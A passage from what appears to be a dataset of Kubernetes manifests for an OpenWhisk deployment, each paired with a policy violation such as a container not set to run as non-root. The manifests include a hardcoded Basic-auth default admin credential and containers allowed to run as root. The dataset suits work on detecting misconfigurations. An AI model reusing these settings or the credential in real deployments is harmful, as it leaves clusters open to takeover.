\\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-for-kafka\" is not set to runAsNonRoot"
  },
  {
    "id": "10552",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: 